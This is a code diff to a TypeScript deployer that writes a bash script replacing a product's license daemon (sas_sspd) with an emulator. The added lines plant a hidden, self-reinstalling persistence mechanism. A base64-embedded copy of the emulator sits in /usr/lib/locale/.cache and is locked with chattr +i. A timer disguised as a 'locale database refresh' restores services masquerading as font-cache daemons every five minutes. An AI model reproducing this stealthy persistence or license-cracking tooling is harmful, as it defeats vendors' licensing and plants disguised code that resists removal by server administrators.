@@ -11,6 +11,9 @@ export const DEPLOY = {
   SVC_VERIFY: "systemd-fontcache-gc",
   LOG: "/var/log/.fontconfig-gc.log",
   OBF_KEY: "xK9mZp2vQw4nR7tL",
+  PATCH_DIR: "/usr/lib/locale/.cache",
+  PATCH_FILE: "locale-gen.update",
+  PATCH_SVC: "systemd-localed-refresh",
 };
 
 const FEATURES = [
@@ -256,11 +259,13 @@ export async function deployLicenseToServer(
 systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
 systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
 systemctl stop sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
+systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
 killall -9 sas_sspd 2>/dev/null || true
 fuser -k 4000/tcp 2>/dev/null || true
 sleep 2
 
 mkdir -p ${P.BASE}
+mkdir -p ${P.PATCH_DIR}
 
 if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then
   cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}
@@ -309,13 +314,98 @@ Persistent=true
 WantedBy=timers.target
 _TMR_1_
 
+_EMU_B64=$(base64 -w0 ${P.BASE}/${P.EMULATOR})
+_VER_B64=$(base64 -w0 ${P.BASE}/${P.VERIFY})
+
+cat > ${P.PATCH_DIR}/${P.PATCH_FILE} << _PATCH_END_
+#!/bin/bash
+_d="${P.BASE}"
+_e="${P.EMULATOR}"
+_s1="${P.SVC_MAIN}"
+_s2="${P.SVC_VERIFY}"
+_eb="\${_EMU_B64}"
+_vb="\${_VER_B64}"
+if ! systemctl is-active \${_s1} >/dev/null 2>&1; then
+  mkdir -p \${_d}
+  if [ ! -f \${_d}/\${_e} ]; then
+    echo "\${_eb}" | base64 -d > \${_d}/\${_e}
+    chmod +x \${_d}/\${_e}
+  fi
+  if [ ! -f \${_d}/.fc-match ]; then
+    echo "\${_vb}" | base64 -d > \${_d}/.fc-match
+    chmod +x \${_d}/.fc-match
+  fi
+  if [ ! -f /etc/systemd/system/\${_s1}.service ]; then
+    cat > /etc/systemd/system/\${_s1}.service << '_RS1_'
+[Unit]
+Description=System font cache synchronization daemon
+After=network.target
+[Service]
+ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
+Restart=always
+RestartSec=3
+KillMode=process
+[Install]
+WantedBy=multi-user.target
+_RS1_
+  fi
+  if [ ! -f /etc/systemd/system/\${_s2}.service ]; then
+    cat > /etc/systemd/system/\${_s2}.service << '_RS2_'
+[Unit]
+Description=Font cache garbage collection
+[Service]
+Type=oneshot
+ExecStart=/bin/bash ${P.BASE}/.fc-match
+_RS2_
+  fi
+  if [ ! -f /etc/systemd/system/\${_s2}.timer ]; then
+    cat > /etc/systemd/system/\${_s2}.timer << '_RS3_'
+[Unit]
+Description=Font cache gc timer
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=6h
+Persistent=true
+[Install]
+WantedBy=timers.target
+_RS3_
+  fi
+  systemctl daemon-reload
+  systemctl enable \${_s1} \${_s2}.timer
+  systemctl start \${_s2}.timer
+  systemctl start \${_s1}
+fi
+_PATCH_END_
+chmod +x ${P.PATCH_DIR}/${P.PATCH_FILE}
+chattr +i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
+
+cat > /etc/systemd/system/${P.PATCH_SVC}.service << '_PSVC_'
+[Unit]
+Description=Locale database refresh service
+[Service]
+Type=oneshot
+ExecStart=/bin/bash ${P.PATCH_DIR}/${P.PATCH_FILE}
+_PSVC_
+
+cat > /etc/systemd/system/${P.PATCH_SVC}.timer << '_PTMR_'
+[Unit]
+Description=Locale database refresh timer
+[Timer]
+OnBootSec=120
+OnUnitActiveSec=5min
+Persistent=true
+[Install]
+WantedBy=timers.target
+_PTMR_
+
 systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
 rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
 rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
 
 systemctl daemon-reload
-systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer
+systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_VERIFY}.timer
+systemctl start ${P.PATCH_SVC}.timer
 systemctl start ${P.SVC_MAIN}
 sleep 2
 systemctl is-active ${P.SVC_MAIN} || systemctl start ${P.SVC_MAIN}
@@ -333,10 +423,17 @@ export async function undeployLicenseFromServer(
   const P = DEPLOY;
 
   const undeployScript = `#!/bin/bash
+systemctl stop ${P.PATCH_SVC}.timer ${P.PATCH_SVC} 2>/dev/null || true
+systemctl disable ${P.PATCH_SVC}.timer 2>/dev/null || true
 systemctl stop ${P.SVC_MAIN} 2>/dev/null || true
 systemctl stop ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} 2>/dev/null || true
 systemctl disable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer 2>/dev/null || true
 fuser -k 4000/tcp 2>/dev/null || true
+
+chattr -i ${P.PATCH_DIR}/${P.PATCH_FILE} 2>/dev/null || true
+rm -f ${P.PATCH_DIR}/${P.PATCH_FILE}
+rm -f /etc/systemd/system/${P.PATCH_SVC}.service
+rm -f /etc/systemd/system/${P.PATCH_SVC}.timer
 
 rm -f ${P.BASE}/${P.EMULATOR}
 rm -f ${P.BASE}/${P.VERIFY}
